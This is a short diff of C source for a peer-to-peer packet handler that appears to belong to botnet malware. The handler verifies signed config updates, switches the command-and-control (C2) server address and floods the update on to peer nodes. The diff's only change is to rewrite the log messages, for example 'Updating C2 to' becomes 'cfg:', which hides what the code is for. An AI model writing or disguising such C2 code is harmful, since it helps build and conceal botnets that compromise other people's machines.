@@ -207,7 +207,7 @@ void p2p_handle_packet(int sock) {
         size_t signed_len = sizeof(WireSignedConfigUpdate) - 64;
         
         if (ed25519_verify(buffer, signed_len, pkg->signature)) {
-            printf("[P2P] Valid Config Update Received! Version: %d\n", pkg_version);
+            printf("cfg: v%d\n", pkg_version);
             current_version = pkg_version;
             
             // Extract IP (Null terminate just in case)
@@ -217,7 +217,7 @@ void p2p_handle_packet(int sock) {
             memcpy(new_ip, pkg->new_ip, ip_len);
             new_ip[ip_len] = '\0';
             
-            printf("[Config] Updating C2 to: %s\n", new_ip);
+            printf("cfg: %s\n", new_ip);
             // proxy_set_c2(new_ip); // Implementation dependent
             
             // Gossip Flood (Forward the WHOLE packet)
@@ -232,7 +232,7 @@ void p2p_handle_packet(int sock) {
                 }
             }
         } else {
-             printf("[Warn] Invalid Config Signature!\n");
+             printf("cfg: bad sig\n");
         }
     }
 }
